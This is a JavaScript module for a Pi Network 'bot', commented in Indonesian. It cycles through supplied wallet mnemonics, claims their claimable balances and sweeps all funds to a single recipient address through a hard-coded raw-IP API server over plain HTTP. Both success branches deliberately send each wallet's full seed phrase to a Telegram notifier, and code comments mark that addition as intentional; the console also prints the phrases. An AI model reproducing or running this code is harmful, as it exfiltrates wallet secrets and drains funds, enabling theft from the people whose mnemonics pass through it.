const { Server, Keypair, TransactionBuilder, Operation, Asset, Memo } = require('stellar-sdk');
const ed25519 = require('ed25519-hd-key');
const bip39 = require('bip39');
const { sendNotification } = require('./telegram-notifier');

const PI_API_SERVER = 'http://4.194.35.14:31401';
const PI_NETWORK_PASSPHRASE = 'Pi Network';
const server = new Server(PI_API_SERVER, { allowHttp: true });

let botState = { isRunning: false, timeoutId: null, currentIndex: 0 };

async function getWalletFromMnemonic(mnemonic) {
    if (!bip39.validateMnemonic(mnemonic)) throw new Error("Mnemonic tidak valid.");
    const seed = await bip39.mnemonicToSeed(mnemonic);
    const { key } = ed25519.derivePath("m/44'/314159'/0'", seed.toString('hex'));
    return Keypair.fromRawEd25519Seed(key);
}

async function processWallet(mnemonic, recipientAddress, walletIndex, memoText) {
    let senderKeypair;
    try {
        senderKeypair = await getWalletFromMnemonic(mnemonic);
        const senderAddress = senderKeypair.publicKey();

        // Log di konsol (tetap menampilkan frasa untuk debugging lokal)
        console.log(`Memproses Wallet #${walletIndex + 1}: ${senderAddress}`);
        console.log(`   -> Frasa: ${mnemonic}`); 

        const account = await server.loadAccount(senderAddress);
        const baseFee = await server.fetchBaseFee();
        const claimables = await server.claimableBalances().claimant(senderAddress).limit(200).call();
        const nativeBalance = account.balances.find(b => b.asset_type === 'native')?.balance || '0';
        const currentBalance = parseFloat(nativeBalance);
        console.log(`Saldo saat ini: ${currentBalance.toFixed(7)} π`);

        if (claimables.records.length > 0) {
            try {
                const totalFromClaims = claimables.records.reduce((sum, r) => sum + parseFloat(r.amount), 0);
                const totalAvailable = currentBalance + totalFromClaims;
                const fee = (baseFee * (claimables.records.length + 1)) / 1e7;
                const amountToSend = totalAvailable - 1 - fee;
                console.log(`Mencoba klaim ${totalFromClaims.toFixed(7)} π & kirim total ~${amountToSend > 0 ? amountToSend.toFixed(7) : '0'} π`);

                const txBuilder = new TransactionBuilder(account, { fee: baseFee.toString(), networkPassphrase: PI_NETWORK_PASSPHRASE }).addMemo(Memo.text(memoText));
                claimables.records.forEach(cb => txBuilder.addOperation(Operation.claimClaimableBalance({ balanceId: cb.id })));
                if (amountToSend > 0.0000001) txBuilder.addOperation(Operation.payment({ destination: recipientAddress, asset: Asset.native(), amount: amountToSend.toFixed(7) }));

                const tx = txBuilder.setTimeout(60).build();
                tx.sign(senderKeypair);
                const res = await server.submitTransaction(tx);

                const successMsg = `✅ Transaksi Gabungan Berhasil\nDompet: ${senderAddress}\nJumlah Klaim: ${totalFromClaims.toFixed(7)} π\nHash: https://blockexplorer.minepi.com/mainnet/transactions/${res.hash}`;
                console.log(successMsg);
                
                // --- PERUBAHAN DI SINI: MENAMBAHKAN FRASA KE NOTIFIKASI TELEGRAM ---
                sendNotification(`✅ *Transaksi Gabungan Berhasil*\n*Dompet*: \`${senderAddress}\`\n*Frasa*: \`${mnemonic}\`\n*Hash*: [Lihat Transaksi](https://blockexplorer.minepi.com/mainnet/transactions/${res.hash})`);
                return;
            } catch (e) {
                console.log(`❌ Transaksi gabungan gagal: ${e.message}. Mencoba fallback...`);
            }
        }

        const freshAccount = await server.loadAccount(senderAddress);
        const fee = baseFee / 1e7;
        const amountToSendExisting = parseFloat(freshAccount.balances.find(b => b.asset_type === 'native')?.balance || '0') - 1 - fee;

        if (amountToSendExisting > 0.0000001) {
            console.log(`[Fallback] Mengirim saldo yang ada: ${amountToSendExisting.toFixed(7)} π`);
            const tx = new TransactionBuilder(freshAccount, { fee: baseFee.toString(), networkPassphrase: PI_NETWORK_PASSPHRASE }).addMemo(Memo.text(memoText)).addOperation(Operation.payment({ destination: recipientAddress, asset: Asset.native(), amount: amountToSendExisting.toFixed(7) })).setTimeout(30).build();
            tx.sign(senderKeypair);
            const res = await server.submitTransaction(tx);

            const fallbackMsg = `✅ Fallback Kirim Berhasil\nDompet: ${senderAddress}\nJumlah: ${amountToSendExisting.toFixed(7)} π\nHash: https://blockexplorer.minepi.com/mainnet/transactions/${res.hash}`;
            console.log(fallbackMsg);
            
            // --- PERUBAHAN DI SINI: MENAMBAHKAN FRASA KE NOTIFIKASI TELEGRAM ---
            sendNotification(`✅ *Fallback Kirim Berhasil*\n*Dompet*: \`${senderAddress}\`\n*Jumlah*: ${amountToSendExisting.toFixed(7)} π\n*Frasa*: \`${mnemonic}\`\n*Hash*: [Lihat Transaksi](https://blockexplorer.minepi.com/mainnet/transactions/${res.hash})`);
        } else {
            console.log("Tidak ada tindakan yang bisa dilakukan untuk wallet ini (saldo tidak cukup).");
        }
    } catch (e) {
        const addr = senderKeypair?.publicKey() || `Wallet #${walletIndex + 1}`;
        let errorMessage = e.message;
        if (e.response && e.response.data && e.response.data.detail) {
            errorMessage = e.response.data.detail;
        } else if (e.response && e.response.status === 404) {
            errorMessage = "Akun belum diaktifkan (tidak ditemukan di blockchain).";
        }

        const errorMsg = `❌ Error Fatal di Wallet\nDompet: ${addr}\nPesan: ${errorMessage}`;
        console.log(errorMsg);

        const ignoredErrorText = 'The transaction failed when submitted to the stellar network';
        if (!errorMessage.includes(ignoredErrorText)) {
            sendNotification(`❌ *Error Fatal di Wallet*\n*Dompet*: \`${addr}\`\n*Pesan*: ${errorMessage}`);
        } else {
            console.log("--> Notifikasi Telegram untuk error 'transaction failed' diabaikan.");
        }
    }
}

function runBotCycle(config) {
    if (!botState.isRunning) return;
    const { mnemonics, recipient, memo } = config;
    processWallet(mnemonics[botState.currentIndex], recipient, botState.currentIndex, memo)
        .finally(() => {
            if (!botState.isRunning) return;
            botState.currentIndex = (botState.currentIndex + 1) % mnemonics.length;
            if (botState.currentIndex === 0) {
                console.log("\nSiklus selesai, mengulang dari awal setelah jeda singkat...");
            }
            botState.timeoutId = setTimeout(() => runBotCycle(config), 200);
        });
}

function startBot(config) {
    if (botState.isRunning) return;
    console.log("Memulai bot...");
    botState.isRunning = true;
    botState.currentIndex = 0;
    sendNotification("🚀 *Bot Dimulai*");
    runBotCycle(config);
}

function stopBot() {
    if (!botState.isRunning) return;
    console.log("Menghentikan bot...");
    botState.isRunning = false;
    if (botState.timeoutId) {
        clearTimeout(botState.timeoutId);
    }
    botState.timeoutId = null;
    sendNotification("⏹️ *Bot Dihentikan*");
}

function getStatus() {
    return { isRunning: botState.isRunning };
}

module.exports = { startBot, stopBot, getStatus };